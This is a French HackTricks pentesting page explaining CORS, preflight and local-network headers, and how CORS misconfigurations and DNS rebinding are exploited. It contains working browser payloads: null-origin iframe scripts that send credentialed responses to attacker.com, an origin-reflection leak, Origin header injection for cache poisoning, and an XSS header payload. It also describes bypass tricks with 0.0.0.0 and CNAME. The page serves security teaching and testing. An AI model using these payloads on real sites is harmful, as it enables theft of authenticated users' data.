# CORS - Mauvaises configurations & Contournement

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Qu'est-ce que CORS ?

Le partage de ressources entre origines multiples (CORS) standard **permet aux serveurs de d√©finir qui peut acc√©der √† leurs ressources** et **quelles m√©thodes de requ√™te HTTP sont autoris√©es** depuis des sources externes.

Une politique de **m√™me origine** exige qu'un **serveur demandant** une ressource et le serveur h√©bergeant la **ressource** partagent le m√™me protocole (par exemple, `http://`), nom de domaine (par exemple, `internal-web.com`), et **port** (par exemple, 80). Selon cette politique, seules les pages web du m√™me domaine et port sont autoris√©es √† acc√©der aux ressources.

L'application de la politique de m√™me origine dans le contexte de `http://normal-website.com/example/example.html` est illustr√©e comme suit :

| URL acc√©d√©e                               | Acc√®s autoris√© ?                       |
| ----------------------------------------- | --------------------------------------- |
| `http://normal-website.com/example/`      | Oui : Sch√©ma, domaine et port identiques |
| `http://normal-website.com/example2/`     | Oui : Sch√©ma, domaine et port identiques |
| `https://normal-website.com/example/`     | Non : Sch√©ma et port diff√©rents         |
| `http://en.normal-website.com/example/`   | Non : Domaine diff√©rent                 |
| `http://www.normal-website.com/example/`  | Non : Domaine diff√©rent                 |
| `http://normal-website.com:8080/example/` | Non : Port diff√©rent\*                  |

\*Internet Explorer ignore le num√©ro de port dans l'application de la politique de m√™me origine, permettant ainsi cet acc√®s.

### En-t√™te `Access-Control-Allow-Origin`

Cet en-t√™te peut autoriser **plusieurs origines**, une valeur **`null`**, ou un caract√®re g√©n√©rique **`*`**. Cependant, **aucun navigateur ne prend en charge plusieurs origines**, et l'utilisation du caract√®re g√©n√©rique `*` est soumise √† des **limitations**. (Le caract√®re g√©n√©rique doit √™tre utilis√© seul, et son utilisation avec `Access-Control-Allow-Credentials: true` n'est pas autoris√©e.)

Cet en-t√™te est **√©mis par un serveur** en r√©ponse √† une demande de ressource inter-domaines initi√©e par un site web, le navigateur ajoutant automatiquement un en-t√™te `Origin`.

### En-t√™te `Access-Control-Allow-Credentials`

Par **d√©faut**, les requ√™tes inter-origines sont effectu√©es sans identifiants comme des cookies ou l'en-t√™te Authorization. Pourtant, un serveur inter-domaines peut autoriser la lecture de la r√©ponse lorsque des identifiants sont envoy√©s en d√©finissant l'en-t√™te `Access-Control-Allow-Credentials` sur **`true`**.

S'il est d√©fini sur `true`, le navigateur transmettra des identifiants (cookies, en-t√™tes d'autorisation ou certificats clients TLS).
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### CSRF Pre-flight request

### Comprendre les requ√™tes pr√©liminaires dans la communication inter-domaines

Lors de l'initiation d'une requ√™te inter-domaines dans des conditions sp√©cifiques, telles que l'utilisation d'une **m√©thode HTTP non standard** (tout sauf HEAD, GET, POST), l'introduction de nouveaux **en-t√™tes**, ou l'emploi d'une valeur sp√©ciale pour l'en-t√™te **Content-Type**, une requ√™te pr√©liminaire peut √™tre n√©cessaire. Cette requ√™te pr√©liminaire, utilisant la m√©thode **`OPTIONS`**, sert √† informer le serveur des intentions de la requ√™te inter-origine √† venir, y compris les m√©thodes HTTP et les en-t√™tes qu'elle pr√©voit d'utiliser.

Le protocole **Cross-Origin Resource Sharing (CORS)** exige cette v√©rification pr√©liminaire pour d√©terminer la faisabilit√© de l'op√©ration inter-origine demand√©e en v√©rifiant les m√©thodes, les en-t√™tes autoris√©s et la fiabilit√© de l'origine. Pour une compr√©hension d√©taill√©e des conditions qui contournent la n√©cessit√© d'une requ√™te pr√©liminaire, consultez le guide complet fourni par [**Mozilla Developer Network (MDN)**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests).

Il est crucial de noter que **l'absence d'une requ√™te pr√©liminaire ne supprime pas l'exigence que la r√©ponse contienne des en-t√™tes d'autorisation**. Sans ces en-t√™tes, le navigateur est incapable de traiter la r√©ponse de la requ√™te inter-origine.

Consid√©rez l'illustration suivante d'une requ√™te pr√©liminaire visant √† utiliser la m√©thode `PUT` avec un en-t√™te personnalis√© nomm√© `Special-Request-Header` :
```
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```
En r√©ponse, le serveur peut renvoyer des en-t√™tes indiquant les m√©thodes accept√©es, l'origine autoris√©e et d'autres d√©tails de la politique CORS, comme indiqu√© ci-dessous :
```markdown
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
* **`Access-Control-Allow-Headers`** : Cet en-t√™te sp√©cifie quels en-t√™tes peuvent √™tre utilis√©s lors de la demande r√©elle. Il est d√©fini par le serveur pour indiquer les en-t√™tes autoris√©s dans les demandes du client.
* **`Access-Control-Expose-Headers`** : Gr√¢ce √† cet en-t√™te, le serveur informe le client des en-t√™tes qui peuvent √™tre expos√©s dans la r√©ponse en plus des en-t√™tes de r√©ponse simples.
* **`Access-Control-Max-Age`** : Cet en-t√™te indique combien de temps les r√©sultats d'une demande pr√©liminaire peuvent √™tre mis en cache. Le serveur d√©finit le temps maximum, en secondes, que les informations renvoy√©es par une demande pr√©liminaire peuvent √™tre r√©utilis√©es.
* **`Access-Control-Request-Headers`** : Utilis√© dans les demandes pr√©liminaires, cet en-t√™te est d√©fini par le client pour informer le serveur des en-t√™tes HTTP que le client souhaite utiliser dans la demande r√©elle.
* **`Access-Control-Request-Method`** : Cet en-t√™te, √©galement utilis√© dans les demandes pr√©liminaires, est d√©fini par le client pour indiquer quelle m√©thode HTTP sera utilis√©e dans la demande r√©elle.
* **`Origin`** : Cet en-t√™te est automatiquement d√©fini par le navigateur et indique l'origine de la demande inter-origine. Il est utilis√© par le serveur pour √©valuer si la demande entrante doit √™tre autoris√©e ou refus√©e en fonction de la politique CORS.

Notez qu'en g√©n√©ral (selon le type de contenu et les en-t√™tes d√©finis) dans une **demande GET/POST, aucune demande pr√©liminaire n'est envoy√©e** (la demande est envoy√©e **directement**), mais si vous souhaitez acc√©der aux **en-t√™tes/corps de la r√©ponse**, cela doit contenir un en-t√™te _Access-Control-Allow-Origin_ l'autorisant.\
**Par cons√©quent, CORS ne prot√®ge pas contre CSRF (mais cela peut √™tre utile).**

### **Demandes de r√©seau local Demande pr√©liminaire**

1. **`Access-Control-Request-Local-Network`** : Cet en-t√™te est inclus dans la demande du client pour signifier que l'enqu√™te vise une ressource de r√©seau local. Il sert de marqueur pour informer le serveur que la demande provient du r√©seau local.
2. **`Access-Control-Allow-Local-Network`** : En r√©ponse, les serveurs utilisent cet en-t√™te pour communiquer que la ressource demand√©e est autoris√©e √† √™tre partag√©e avec des entit√©s en dehors du r√©seau local. Il agit comme un feu vert pour le partage de ressources √† travers diff√©rentes fronti√®res de r√©seau, garantissant un acc√®s contr√¥l√© tout en maintenant des protocoles de s√©curit√©.

Une **r√©ponse valide autorisant la demande de r√©seau local** doit √©galement contenir dans la r√©ponse l'en-t√™te `Access-Controls-Allow-Local_network: true` :
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
Notez que l'IP linux **0.0.0.0** fonctionne pour **contourner** ces exigences pour acc√©der √† localhost, car cette adresse IP n'est pas consid√©r√©e comme "locale".

Il est √©galement possible de **contourner les exigences du r√©seau local** si vous utilisez **l'adresse IP publique d'un point de terminaison local** (comme l'IP publique du routeur). Car dans plusieurs cas, m√™me si l'**IP publique** est accessible, si c'est **du r√©seau local**, l'acc√®s sera accord√©.
{% endhint %}

## Mauvaises configurations exploitables

Il a √©t√© observ√© que le param√®tre `Access-Control-Allow-Credentials` √† **`true`** est un pr√©requis pour la plupart des **vrais attaques**. Ce param√®tre permet au navigateur d'envoyer des informations d'identification et de lire la r√©ponse, augmentant ainsi l'efficacit√© de l'attaque. Sans cela, l'avantage de faire √©mettre une requ√™te par un navigateur plut√¥t que de le faire soi-m√™me diminue, car tirer parti des cookies d'un utilisateur devient irr√©alisable.

### Exception : Exploiter la localisation r√©seau comme authentification

Une exception existe o√π la localisation r√©seau de la victime agit comme une forme d'authentification. Cela permet d'utiliser le navigateur de la victime comme un proxy, contournant l'authentification bas√©e sur l'IP pour acc√©der aux applications intranet. Cette m√©thode partage des similitudes d'impact avec le DNS rebinding mais est plus simple √† exploiter.

### R√©flexion de `Origin` dans `Access-Control-Allow-Origin`

Le sc√©nario du monde r√©el o√π la valeur de l'en-t√™te `Origin` est r√©fl√©chie dans `Access-Control-Allow-Origin` est th√©oriquement improbable en raison des restrictions sur la combinaison de ces en-t√™tes. Cependant, les d√©veloppeurs cherchant √† activer CORS pour plusieurs URL peuvent g√©n√©rer dynamiquement l'en-t√™te `Access-Control-Allow-Origin` en copiant la valeur de l'en-t√™te `Origin`. Cette approche peut introduire des vuln√©rabilit√©s, en particulier lorsqu'un attaquant utilise un domaine avec un nom con√ßu pour sembler l√©gitime, trompant ainsi la logique de validation.
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example.com/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### Exploiter l'origine `null`

L'origine `null`, sp√©cifi√©e pour des situations comme les redirections ou les fichiers HTML locaux, occupe une position unique. Certaines applications ajoutent cette origine √† la liste blanche pour faciliter le d√©veloppement local, permettant involontairement √† n'importe quel site web de simuler une origine `null` via une iframe sandbox√©e, contournant ainsi les restrictions CORS.
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### Techniques de contournement par expression r√©guli√®re

Lorsqu'on rencontre une liste blanche de domaines, il est crucial de tester les opportunit√©s de contournement, comme l'ajout du domaine de l'attaquant √† un domaine sur liste blanche ou l'exploitation des vuln√©rabilit√©s de prise de contr√¥le de sous-domaines. De plus, les expressions r√©guli√®res utilis√©es pour la validation des domaines peuvent n√©gliger des nuances dans les conventions de nommage des domaines, pr√©sentant ainsi d'autres opportunit√©s de contournement.

### Contournements avanc√©s par expression r√©guli√®re

Les motifs Regex se concentrent g√©n√©ralement sur les caract√®res alphanum√©riques, le point (.) et le tiret (-), n√©gligeant d'autres possibilit√©s. Par exemple, un nom de domaine con√ßu pour inclure des caract√®res interpr√©t√©s diff√©remment par les navigateurs et les motifs regex peut contourner les v√©rifications de s√©curit√©. La gestion des caract√®res de soulignement dans les sous-domaines par Safari, Chrome et Firefox illustre comment de telles divergences peuvent √™tre exploit√©es pour contourner la logique de validation des domaines.

**Pour plus d'informations et de param√®tres concernant ce contr√¥le de contournement :** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **et** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![https://miro.medium.com/v2/resize:fit:720/format:webp/1\*rolEK39-DDxeBgSq6KLKAA.png](<../.gitbook/assets/image (284).png>)

### Depuis XSS √† l'int√©rieur d'un sous-domaine

Les d√©veloppeurs mettent souvent en ≈ìuvre des m√©canismes de d√©fense pour se prot√©ger contre l'exploitation CORS en ajoutant des domaines √† la liste blanche qui sont autoris√©s √† demander des informations. Malgr√© ces pr√©cautions, la s√©curit√© du syst√®me n'est pas infaillible. La pr√©sence m√™me d'un seul sous-domaine vuln√©rable au sein des domaines sur liste blanche peut ouvrir la porte √† l'exploitation CORS par le biais d'autres vuln√©rabilit√©s, telles que XSS (Cross-Site Scripting).

Pour illustrer, consid√©rons le sc√©nario o√π un domaine, `requester.com`, est sur liste blanche pour acc√©der aux ressources d'un autre domaine, `provider.com`. La configuration c√¥t√© serveur pourrait ressembler √† ceci :
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com') {
// Access data
} else {
// Unauthorized access
}
```
Dans cette configuration, tous les sous-domaines de `requester.com` sont autoris√©s √† acc√©der. Cependant, si un sous-domaine, disons `sub.requester.com`, est compromis avec une vuln√©rabilit√© XSS, un attaquant peut exploiter cette faiblesse. Par exemple, un attaquant ayant acc√®s √† `sub.requester.com` pourrait exploiter la vuln√©rabilit√© XSS pour contourner les politiques CORS et acc√©der de mani√®re malveillante aux ressources sur `provider.com`.

### **Poisonnement de cache c√¥t√© serveur**

[**D'apr√®s cette recherche**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

Il est possible qu'en exploitant le poisonnement de cache c√¥t√© serveur par injection d'en-t√™te HTTP, une vuln√©rabilit√© XSS stock√©e puisse √™tre induite. Ce sc√©nario se d√©roule lorsqu'une application ne parvient pas √† assainir l'en-t√™te `Origin` pour des caract√®res ill√©gaux, cr√©ant une vuln√©rabilit√© particuli√®rement pour les utilisateurs d'Internet Explorer et d'Edge. Ces navigateurs traitent (0x0d) comme un terminateur d'en-t√™te HTTP l√©gitime, entra√Ænant des vuln√©rabilit√©s d'injection d'en-t√™te HTTP.

Consid√©rez la requ√™te suivante o√π l'en-t√™te `Origin` est manipul√© :
```
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```
Internet Explorer et Edge interpr√®tent la r√©ponse comme :
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```
Bien que l'exploitation directe de cette vuln√©rabilit√© en faisant envoyer un en-t√™te malform√© par un navigateur web ne soit pas r√©alisable, une requ√™te √©labor√©e peut √™tre g√©n√©r√©e manuellement √† l'aide d'outils comme Burp Suite. Cette m√©thode pourrait conduire √† un cache c√¥t√© serveur enregistrant la r√©ponse et la servant involontairement √† d'autres. Le payload √©labor√© vise √† modifier l'ensemble de caract√®res de la page en UTF-7, un encodage de caract√®res souvent associ√© aux vuln√©rabilit√©s XSS en raison de sa capacit√© √† encoder des caract√®res d'une mani√®re qui peut √™tre ex√©cut√©e comme un script dans certains contextes.

Pour en savoir plus sur les vuln√©rabilit√©s XSS stock√©es, consultez [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored).

**Remarque** : L'exploitation des vuln√©rabilit√©s d'injection d'en-t√™tes HTTP, en particulier par le biais du poisoning de cache c√¥t√© serveur, souligne l'importance critique de valider et de d√©sinfecter toutes les entr√©es fournies par l'utilisateur, y compris les en-t√™tes HTTP. Employez toujours un mod√®le de s√©curit√© robuste qui inclut la validation des entr√©es pour pr√©venir de telles vuln√©rabilit√©s.

### **Poisoning de cache c√¥t√© client**

[**√Ä partir de cette recherche**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

Dans ce sc√©nario, une instance d'une page web refl√©tant le contenu d'un en-t√™te HTTP personnalis√© sans encodage appropri√© est observ√©e. Plus pr√©cis√©ment, la page web renvoie le contenu inclus dans un en-t√™te `X-User-id`, qui pourrait inclure du JavaScript malveillant, comme le d√©montre l'exemple o√π l'en-t√™te contient une balise d'image SVG con√ßue pour ex√©cuter du code JavaScript au chargement.

Les politiques de partage de ressources entre origines (CORS) permettent l'envoi d'en-t√™tes personnalis√©s. Cependant, sans que la r√©ponse soit directement rendue par le navigateur en raison des restrictions CORS, l'utilit√© d'une telle injection pourrait sembler limit√©e. Le point critique se pose lorsque l'on consid√®re le comportement de cache du navigateur. Si l'en-t√™te `Vary: Origin` n'est pas sp√©cifi√©, il devient possible que la r√©ponse malveillante soit mise en cache par le navigateur. Par la suite, cette r√©ponse mise en cache pourrait √™tre rendue directement lors de la navigation vers l'URL, contournant ainsi la n√©cessit√© d'un rendu direct lors de la requ√™te initiale. Ce m√©canisme renforce la fiabilit√© de l'attaque en tirant parti du cache c√¥t√© client.

Pour illustrer cette attaque, un exemple de JavaScript est fourni, con√ßu pour √™tre ex√©cut√© dans l'environnement d'une page web, comme √† travers un JSFiddle. Ce script effectue une action simple : il envoie une requ√™te √† une URL sp√©cifi√©e avec un en-t√™te personnalis√© contenant le JavaScript malveillant. Une fois la requ√™te r√©ussie, il tente de naviguer vers l'URL cible, d√©clenchant potentiellement l'ex√©cution du script inject√© si la r√©ponse a √©t√© mise en cache sans un traitement appropri√© de l'en-t√™te `Vary: Origin`.

Voici un r√©sum√© du JavaScript utilis√© pour ex√©cuter cette attaque :
```html
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // Note: Be cautious of mixed content blocking for HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
req.send();
</script>
```
## Bypass

### XSSI (Cross-Site Script Inclusion) / JSONP

XSSI, √©galement connu sous le nom de Cross-Site Script Inclusion, est un type de vuln√©rabilit√© qui tire parti du fait que la Same Origin Policy (SOP) ne s'applique pas lors de l'inclusion de ressources √† l'aide de la balise script. Cela est d√ª au fait que les scripts doivent pouvoir √™tre inclus depuis diff√©rents domaines. Cette vuln√©rabilit√© permet √† un attaquant d'acc√©der et de lire tout contenu qui a √©t√© inclus √† l'aide de la balise script.

Cette vuln√©rabilit√© devient particuli√®rement significative lorsqu'il s'agit de JavaScript dynamique ou de JSONP (JSON avec Padding), surtout lorsque des informations d'autorit√© ambiante comme les cookies sont utilis√©es pour l'authentification. Lors de la demande d'une ressource depuis un h√¥te diff√©rent, les cookies sont inclus, les rendant accessibles √† l'attaquant.

Pour mieux comprendre et att√©nuer cette vuln√©rabilit√©, vous pouvez utiliser le plugin BurpSuite disponible √† [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp). Ce plugin peut aider √† identifier et √† traiter les vuln√©rabilit√©s XSSI potentielles dans vos applications web.

[**Lisez-en plus sur les diff√©rents types d'XSSI et comment les exploiter ici.**](xssi-cross-site-script-inclusion.md)

Essayez d'ajouter un **`callback`** **param√®tre** dans la requ√™te. Peut-√™tre que la page a √©t√© pr√©par√©e pour envoyer les donn√©es sous forme de JSONP. Dans ce cas, la page renverra les donn√©es avec `Content-Type: application/javascript`, ce qui contournera la politique CORS.

![](<../.gitbook/assets/image (856).png>)

### Bypass facile (inutile ?)

Une fa√ßon de contourner la restriction `Access-Control-Allow-Origin` est de demander √† une application web de faire une requ√™te en votre nom et de renvoyer la r√©ponse. Cependant, dans ce sc√©nario, les identifiants de la victime finale ne seront pas envoy√©s car la requ√™te est faite √† un domaine diff√©rent.

1. [**CORS-escape**](https://github.com/shalvah/cors-escape) : Cet outil fournit un proxy qui transmet votre requ√™te avec ses en-t√™tes, tout en falsifiant l'en-t√™te Origin pour correspondre au domaine demand√©. Cela contourne effectivement la politique CORS. Voici un exemple d'utilisation avec XMLHttpRequest :
2. [**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape) : Cet outil offre une approche alternative pour le proxy des requ√™tes. Au lieu de transmettre votre requ√™te telle quelle, le serveur effectue sa propre requ√™te avec les param√®tres sp√©cifi√©s.

### Bypass Iframe + Popup

Vous pouvez **contourner les v√©rifications CORS** telles que `e.origin === window.origin` en **cr√©ant un iframe** et **en ouvrant une nouvelle fen√™tre depuis celui-ci**. Plus d'informations sur la page suivante :

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### Rebinding DNS via TTL

Le rebinding DNS via TTL est une technique utilis√©e pour contourner certaines mesures de s√©curit√© en manipulant les enregistrements DNS. Voici comment cela fonctionne :

1. L'attaquant cr√©e une page web et fait acc√©der la victime √† celle-ci.
2. L'attaquant change ensuite le DNS (IP) de son propre domaine pour pointer vers la page web de la victime.
3. Le navigateur de la victime met en cache la r√©ponse DNS, qui peut avoir une valeur TTL (Time to Live) indiquant combien de temps l'enregistrement DNS doit √™tre consid√©r√© comme valide.
4. Lorsque le TTL expire, le navigateur de la victime effectue une nouvelle requ√™te DNS, permettant √† l'attaquant d'ex√©cuter du code JavaScript sur la page de la victime.
5. En maintenant le contr√¥le sur l'IP de la victime, l'attaquant peut recueillir des informations de la victime sans envoyer de cookies au serveur de la victime.

Il est important de noter que les navigateurs ont des m√©canismes de mise en cache qui peuvent emp√™cher l'abus imm√©diat de cette technique, m√™me avec de faibles valeurs TTL.

Le rebinding DNS peut √™tre utile pour contourner les v√©rifications IP explicites effectu√©es par la victime ou pour des sc√©narios o√π un utilisateur ou un bot reste sur la m√™me page pendant une p√©riode prolong√©e, permettant √† la cache d'expirer.

Si vous avez besoin d'un moyen rapide d'abuser du rebinding DNS, vous pouvez utiliser des services comme [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html).

Pour ex√©cuter votre propre serveur de rebinding DNS, vous pouvez utiliser des outils comme **DNSrebinder** ([https://github.com/mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSrebinder)). Cela implique d'exposer votre port local 53/udp, de cr√©er un enregistrement A pointant vers celui-ci (par exemple, ns.example.com), et de cr√©er un enregistrement NS pointant vers le sous-domaine A pr√©c√©demment cr√©√© (par exemple, ns.example.com). Tout sous-domaine du sous-domaine ns.example.com sera alors r√©solu par votre h√¥te.

Vous pouvez √©galement explorer un serveur public en cours d'ex√©cution √† [http://rebind.it/singularity.html](http://rebind.it/singularity.html) pour une meilleure compr√©hension et exp√©rimentation.

### Rebinding DNS via **DNS Cache Flooding**

Le rebinding DNS via le flooding de cache DNS est une autre technique utilis√©e pour contourner le m√©canisme de mise en cache des navigateurs et forcer une seconde requ√™te DNS. Voici comment cela fonctionne :

1. Initialement, lorsque la victime effectue une requ√™te DNS, elle re√ßoit l'adresse IP de l'attaquant.
2. Pour contourner la d√©fense de mise en cache, l'attaquant utilise un service worker. Le service worker inonde le cache DNS, ce qui supprime effectivement le nom du serveur de l'attaquant mis en cache.
3. Lorsque le navigateur de la victime effectue une seconde requ√™te DNS, il re√ßoit maintenant l'adresse IP 127.0.0.1, qui fait g√©n√©ralement r√©f√©rence √† l'h√¥te local.

En inondant le cache DNS avec le service worker, l'attaquant peut manipuler le processus de r√©solution DNS et forcer le navigateur de la victime √† effectuer une seconde requ√™te, cette fois-ci r√©solvant √† l'adresse IP souhait√©e par l'attaquant.

### Rebinding DNS via **Cache**

Une autre fa√ßon de contourner la d√©fense de mise en cache est d'utiliser plusieurs adresses IP pour le m√™me sous-domaine dans le fournisseur DNS. Voici comment cela fonctionne :

1. L'attaquant configure deux enregistrements A (ou un seul enregistrement A avec deux IP) pour le m√™me sous-domaine dans le fournisseur DNS.
2. Lorsque le navigateur v√©rifie ces enregistrements, il re√ßoit les deux adresses IP.
3. Si le navigateur d√©cide d'utiliser d'abord l'adresse IP de l'attaquant, l'attaquant peut servir une charge utile qui effectue des requ√™tes HTTP vers le m√™me domaine.
4. Cependant, une fois que l'attaquant obtient l'adresse IP de la victime, il cesse de r√©pondre au navigateur de la victime.
5. Le navigateur de la victime, r√©alisant que le domaine ne r√©pond pas, passe √† utiliser la seconde adresse IP donn√©e.
6. En acc√©dant √† la seconde adresse IP, le navigateur contourne la Same Origin Policy (SOP), permettant √† l'attaquant d'abuser de cela et de recueillir et exfiltrer des informations.

Cette technique exploite le comportement des navigateurs lorsque plusieurs adresses IP sont fournies pour un domaine. En contr√¥lant strat√©giquement les r√©ponses et en manipulant le choix de l'adresse IP par le navigateur, un attaquant peut exploiter la SOP et acc√©der aux informations de la victime.

{% hint style="warning" %}
Notez que pour acc√©der √† localhost, vous devriez essayer de rebind **127.0.0.1** sous Windows et **0.0.0.0** sous Linux.\
Des fournisseurs tels que godaddy ou cloudflare ne m'ont pas permis d'utiliser l'IP 0.0.0.0, mais AWS route53 m'a permis de cr√©er un enregistrement A avec 2 IP, l'une d'elles √©tant "0.0.0.0"

<img src="../.gitbook/assets/image (140).png" alt="" data-size="original">
{% endhint %}

Pour plus d'infos, vous pouvez consulter [https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/)

### Autres contournements courants

* Si **les IP internes ne sont pas autoris√©es**, ils pourraient **oublier d'interdire 0.0.0.0** (fonctionne sous Linux et Mac)
* Si **les IP internes ne sont pas autoris√©es**, r√©pondez avec un **CNAME** vers **localhost** (fonctionne sous Linux et Mac)
* Si **les IP internes ne sont pas autoris√©es** en tant que r√©ponses DNS, vous pouvez r√©pondre avec des **CNAMEs vers des services internes** tels que www.corporate.internal.

### Rebinding DNS arm√©

Vous pouvez trouver plus d'informations sur les techniques de contournement pr√©c√©dentes et comment utiliser l'outil suivant dans la pr√©sentation [Gerald Doussot - √âtat des attaques de rebinding DNS & Singularit√© de l'origine - Conf√©rence DEF CON 27](https://www.youtube.com/watch?v=y9-0lICNjOQ).

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) est un outil pour effectuer des attaques de [rebinding DNS](https://en.wikipedia.org/wiki/DNS\_rebinding). Il comprend les composants n√©cessaires pour rebind l'adresse IP du nom DNS du serveur d'attaque √† l'adresse IP de la machine cible et pour servir des charges utiles d'attaque afin d'exploiter des logiciels vuln√©rables sur la machine cible.

### R√©elle protection contre le rebinding DNS

* Utilisez TLS dans les services internes
* Demandez une authentification pour acc√©der aux donn√©es
* Validez l'en-t√™te Host
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/) : Proposition d'envoyer toujours une requ√™te pr√©liminaire lorsque des serveurs publics souhaitent acc√©der √† des serveurs internes

## **Outils**

**Fuzz des configurations incorrectes possibles dans les politiques CORS**

* [https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8](https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8)
* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)
* [https://github.com/omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne)

## R√©f√©rences

* [https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)
* [https://portswigger.net/web-security/cors/access-control-allow-origin](https://portswigger.net/web-security/cors/access-control-allow-origin)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS)
* [https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [https://www.codecademy.com/articles/what-is-cors](https://www.codecademy.com/articles/what-is-cors)
* [https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors](https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors)
* [https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646](https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
* [https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b](https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b)

